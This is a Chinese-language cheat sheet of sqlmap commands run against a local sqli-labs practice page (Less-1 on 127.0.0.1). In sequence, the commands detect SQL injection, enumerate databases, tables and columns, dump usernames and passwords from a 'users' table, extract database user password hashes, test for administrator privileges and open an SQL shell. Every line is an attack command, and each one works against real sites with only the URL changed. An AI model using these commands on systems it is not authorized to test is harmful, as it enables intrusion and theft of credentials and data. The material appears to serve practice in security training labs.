# 判断注入

## 判断是否存在注入

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --batch
```

## 查询所有数据库

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs
```

## 查询指定数据库数据表

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security --tables
```

## 查询指定的字段

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users --columns
```

## 查询指定的表的具体数据

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users -C id,password,username --dump
```

## 获取数据库所有用户

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --users
```

## 获取数据库密码

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --passwords --batch
```

## 获取当前正在使用的数据库名称

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-db --batch
```

## 设置探测等级为5，并且看当前用户是否有管理员权限

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --level 5 --is-dba
```

## 运行自定义sql语句

```
sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --sql-shell
```

